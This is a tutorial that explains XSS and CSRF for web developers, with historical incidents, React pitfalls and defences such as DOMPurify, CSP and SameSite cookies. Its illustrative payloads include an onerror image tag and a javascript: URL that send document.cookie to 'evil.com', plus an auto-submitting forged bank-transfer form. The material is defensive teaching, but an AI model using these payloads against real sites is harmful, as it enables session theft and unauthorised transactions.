## Short answer

| | **XSS** (Cross-Site Scripting) | **CSRF** (Cross-Site Request Forgery) |
|---|---|---|
| **What happens** | Attacker **runs their JavaScript on your site** | Attacker **makes your browser send a request** to a site you're logged into |
| **Trust abused** | The **user trusts the site** | The **site trusts the user's browser** (cookies) |
| **Attacker can** | Read data, steal tokens, act as the user, change the page | Only **trigger actions**; can't read the response |
| **Main defence** | Escape output, sanitise HTML (**DOMPurify**), CSP | **SameSite cookies**, CSRF tokens, check Origin |

**Analogy:**

- **XSS:** a stranger **slips a fake note into the company notice board**. Everyone who reads it follows the instructions, believing the company wrote it.
- **CSRF:** a stranger **gets you to sign a cheque without looking**. The bank sees *your* signature, so it pays.

---

## How XSS works

Your site shows **user-provided text as HTML** instead of plain text, so the browser runs it as code:

```js
// A comment from a user:
const comment = '<img src="x" onerror="fetch(\'https://evil.com?c=\' + document.cookie)">'

// ❌ Vulnerable: treats it as HTML
commentBox.innerHTML = comment
// The image fails to load → onerror runs → cookies are sent to the attacker
```

**Why it's so dangerous:** the script runs **as your site**, with the **user's session**. It can:

- **Steal tokens** from `localStorage` and cookies (cookies only if they're not `HttpOnly`).
- **Make API calls as the user**: change their email or password, transfer money.
- **Show a fake login form** to steal passwords.
- **Log keystrokes.**

---

## 3 types of XSS

| Type | Where the script comes from | Example |
|---|---|---|
| **Stored** ⭐ (worst) | Saved in the **database**, so it hits **every visitor** | A malicious comment, profile bio or product review |
| **Reflected** | In the **URL**, which the server echoes back | `site.com/search?q=<script>...</script>` sent in a phishing link |
| **DOM-based** | **Frontend JavaScript** puts URL or user data into the DOM | `el.innerHTML = location.hash` |

```js
// DOM-based XSS: purely a frontend bug
// URL: site.com/#<img src=x onerror=alert(1)>
document.getElementById('welcome').innerHTML = decodeURIComponent(location.hash.slice(1))   // ❌
```

---

## Real-world XSS

### The Samy worm: MySpace, 2005 ⭐ (the most famous)

- **Samy Kamkar put JavaScript in his MySpace profile**, getting around MySpace's filters with tricks such as splitting the word `java\nscript`.
- **Anyone who viewed his profile** silently:
  1. **Added Samy as a friend.**
  2. **Had their profile text changed** to "but most of all, samy is my hero".
  3. **Had the worm copied into their own profile.**
- **It spread to over 1 million users in about 20 hours.** MySpace had to shut down to clean it up.
- **Type: stored XSS.** It's also a **worm**, because it copies itself.

### Twitter "onMouseOver" worm, 2010

- **Tweets contained a link with an `onmouseover` attribute** that Twitter didn't escape.
- **Just moving the mouse over the tweet** ran the script, which retweeted itself.
- **Hundreds of thousands of accounts were affected within hours.**

### TweetDeck, 2014

- **A tweet containing a `<script>` tag** ran in TweetDeck, which rendered tweets as HTML.
- **It automatically retweeted itself** about 80,000 times before TweetDeck was taken offline.

**The lesson from all three:** a single place that rendered user text as HTML, with no escaping, was enough.

---

## XSS in React

### ✅ React escapes by default

```jsx
const comment = '<img src=x onerror=alert(1)>'
return <p>{comment}</p>
// Shows the text literally: <img src=x onerror=alert(1)>  ✅ safe
```

**JSX turns `<` into `&lt;`**, so anything in `{}` is displayed as text, never as HTML. This blocks most XSS automatically.

### ❌ The holes where React can't protect you

```jsx
// 1. dangerouslySetInnerHTML: the name is a warning!
<div dangerouslySetInnerHTML={{ __html: userBio }} />          // ❌

// 2. javascript: URLs from users
<a href={user.website}>Website</a>
// if website = "javascript:fetch('https://evil.com?c='+document.cookie)"  ❌
// (React 19 blocks javascript: URLs, but always validate URLs yourself)

// 3. Going around React with refs
divRef.current.innerHTML = userInput                           // ❌

// 4. eval / new Function / setTimeout with a string
eval(userInput)                                                // ❌

// 5. Server-side rendering: putting raw JSON inside a <script>
`<script>window.__DATA__ = ${JSON.stringify(data)}</script>`  // ❌ "</script>" in data breaks out
```

**Fix for URLs:** only allow `http:` and `https:`:

```js
function safeUrl(url) {
  try {
    const { protocol } = new URL(url)
    return protocol === 'http:' || protocol === 'https:' ? url : '#'
  } catch {
    return '#'
  }
}

<a href={safeUrl(user.website)}>Website</a>
```

---

## DOMPurify

**DOMPurify is a library that cleans HTML.** It **keeps safe tags** (`<b>`, `<p>`, `<a href="https://...">`) and **removes anything dangerous** (`<script>`, `onerror=`, `javascript:` links).

**Use it whenever you *must* render user HTML**: rich-text editors, CMS content, comments with formatting, or HTML emails.

```bash
npm install dompurify
```

```js
import DOMPurify from 'dompurify'

const dirty = `
  <p>Hello <b>friend</b></p>
  <img src="x" onerror="alert('hacked')">
  <script>stealCookies()</script>
  <a href="javascript:alert(1)">click</a>
`

const clean = DOMPurify.sanitize(dirty)
// <p>Hello <b>friend</b></p>
// <img src="x">
// <a>click</a>
```

**What was removed:** `onerror`, the whole `<script>` tag, and the `javascript:` link. The safe formatting stayed.

### With React

```jsx
import DOMPurify from 'dompurify'

function Comment({ html }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
  )
}
```

### Configure what's allowed

```js
// Only allow basic formatting
DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
})

// Make every link open safely in a new tab
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }
})
```

### DOMPurify rules

- ✅ **Sanitise right before rendering**, not only when saving. Old data in the database, or a new bypass, could still be dangerous.
- ✅ **Don't modify the HTML after sanitising**, for example with string replacements, because that can bring the danger back.
- ✅ **Keep it updated.** New bypasses get fixed in new versions.
- ✅ **On the server (SSR)** it needs a fake DOM: use `isomorphic-dompurify`, or `jsdom` with DOMPurify.
- ❌ **It does NOT protect against CSRF** or other attacks. It only cleans HTML.
- 💡 **Prefer not to use HTML at all.** Markdown rendered by a safe renderer is better. (This site uses `react-markdown`, which **ignores raw HTML by default**, so it's safe.)

---

## Other XSS defences

| Defence | What it does |
|---|---|
| **Escape output** | React does this for you in `{}` |
| **DOMPurify** | Clean HTML you must render |
| **CSP** (Content-Security-Policy header) | Tell the browser to **only run scripts from your domain**, so injected inline scripts are blocked. A safety net. |
| **`HttpOnly` cookies** | JavaScript can't read them, so XSS can't steal the session cookie |
| **Trusted Types** | A browser feature that forces `innerHTML` to only accept sanitised values |
| **Validate input** | Reject unexpected formats: emails, URLs, numbers |

```
Content-Security-Policy: script-src 'self'; object-src 'none'
```

---

## How CSRF works

**Browsers automatically attach cookies** to every request to a site, **even when the request comes from a different site**.

So if you're logged into your bank and visit an evil page:

```html
<!-- On evil.com -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('f').submit()</script>
```

1. **You open evil.com**, maybe from a link in an email.
2. **The hidden form posts to bank.com.**
3. **The browser attaches your bank.com session cookie automatically.**
4. **The bank sees a valid logged-in request and transfers the money.** 💸

**You never clicked anything on the bank.** The attacker just "borrowed" your logged-in browser.

**Even simpler, if the site uses GET for actions:**

```html
<img src="https://bank.com/transfer?to=attacker&amount=5000" />
```

**Key point:** the attacker **can't see the response**. CSRF is about **making you do something**, not reading your data.

---

## Real-world CSRF

### Gmail, 2007: domain stolen ⭐

- **Gmail had a CSRF bug in its "create filter" feature.**
- **Victims who visited a malicious page while logged into Gmail** had a filter silently added that **forwarded their emails to the attacker**.
- **Designer David Airey lost his domain name this way.** The attacker forwarded his emails, used them to take over his domain registrar account, and transferred the domain away.

### Netflix, 2006

- **Researchers showed that a malicious page could act on a logged-in user's Netflix account**: add DVDs to their rental queue, and change their name and shipping address.
- **Changing the shipping address** meant an attacker could redirect the victim's DVDs.

### ING Direct (bank), 2008

- **Researchers (Zeller & Felten, Princeton) found** that a malicious website could **open new accounts and transfer money out of a victim's account**, as long as the victim was logged in.
- **It was fixed before it was known to be abused.** It's a classic example of why money-moving actions need CSRF protection.

### uTorrent, 2008

- **uTorrent's web UI ran on `localhost`.** A malicious page could send requests to it, making the victim's computer **download files or change settings**.
- **It shows that even local apps can be CSRF targets.**

---

## CSRF defences

### 1. `SameSite` cookies ⭐ (the modern main defence)

```
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
```

| Value | Cookie sent from other sites? |
|---|---|
| `Strict` | ❌ never (even clicking a link from Google arrives logged out) |
| `Lax` | ✅ only for top-level **GET** navigation (clicking a link); ❌ for forms POSTed from other sites, images and fetch |
| `None` | ✅ always (requires `Secure`); no protection |

Chrome treats cookies without a `SameSite` setting as **`Lax` by default** (since 2020), which blocks the classic hidden-form attack.

### 2. CSRF tokens

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="r4nd0m-s3cr3t-t0k3n" />
  ...
</form>
```

- **The server generates a random token per session** and checks it on every POST.
- **evil.com can't read your page** (blocked by the same-origin policy), so it **can't know the token**.

### 3. Check the `Origin` / `Referer` header

The server rejects state-changing requests whose `Origin` isn't its own domain.

### 4. Never change data with GET

GET should only **read** data. Use POST, PUT or DELETE for actions.

### 5. APIs that require JSON or custom headers

```js
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
  credentials: 'include',
  body: JSON.stringify({ to: 'friend', amount: 100 }),
})
```

**Custom headers and a JSON content type trigger a CORS preflight.** A different site's request is blocked unless the server allows that origin.

### Tokens in `localStorage` vs cookies

| Auth storage | CSRF risk | XSS risk |
|---|---|---|
| **Cookie** (auto-sent) | ⚠️ yes, so use SameSite and tokens | ✅ lower with `HttpOnly` |
| **localStorage + `Authorization` header** | ✅ none (not auto-sent) | ⚠️ XSS can steal it |

**There's no free lunch.** The common recommendation is **`HttpOnly` + `Secure` + `SameSite` cookies**, plus XSS defences.

---

## XSS beats CSRF protection

**If a site has XSS, CSRF defences don't help.** The attacker's script runs *on your site*, so it can:

- **Read the CSRF token** from the page.
- **Send same-site requests**, so `SameSite` doesn't apply.

**So XSS is generally the more serious of the two.**

---

## Quick Q&A

**Q: Is React safe from XSS?**
Mostly. JSX escapes values by default. The risks are `dangerouslySetInnerHTML`, user-controlled `href`/`src` URLs, direct DOM access through refs, `eval`, and SSR data injection.

**Q: When do you use DOMPurify?**
When you must render user-provided HTML, for example from a rich-text editor. Sanitise right before `dangerouslySetInnerHTML`.

**Q: Does `HttpOnly` prevent XSS?**
No. It only stops XSS from **reading the cookie**. The script can still make requests as the user.

**Q: Does CORS prevent CSRF?**
Not by itself. CORS controls **reading responses**. Simple form POSTs are still **sent**. Preflighted requests (JSON or custom headers) are blocked before sending, unless allowed.

**Q: What's the difference in one line?**
XSS = **attacker's code runs on your site**. CSRF = **attacker makes your browser send a request to a site you're logged into**.

---

## 🎯 Interview answer

> "XSS, cross-site scripting, is when an attacker gets their JavaScript to run on our site, usually because user input is rendered as HTML. It comes in three types: stored, saved in the database and served to every visitor, like the Samy worm that spread to over a million MySpace profiles in a day; reflected, through a malicious URL; and DOM-based, when frontend code writes untrusted data into the DOM. Since the script runs with the user's session, it can steal tokens or act as the user. React prevents most XSS because JSX escapes values, so the risks are `dangerouslySetInnerHTML`, user-controlled `javascript:` URLs, direct `innerHTML` through refs, and `eval`. When I must render user HTML, I sanitise it with DOMPurify right before rendering, which strips scripts, event handlers and `javascript:` links while keeping safe formatting, and I add a Content-Security-Policy and `HttpOnly` cookies as extra layers.
>
> CSRF, cross-site request forgery, is when a malicious site makes the user's browser send a request to a site they're logged into, and the browser attaches the session cookie automatically. For example, a hidden auto-submitting form that transfers money; Gmail had a CSRF bug in 2007 that let attackers add email-forwarding filters, which was used to steal a victim's domain. The attacker can't read the response, only trigger actions. Defences are `SameSite` cookies, which browsers now default to `Lax`, CSRF tokens, checking the `Origin` header, and never changing data with GET. And XSS defeats CSRF protection, because a script on the page can read the token, so XSS prevention comes first."
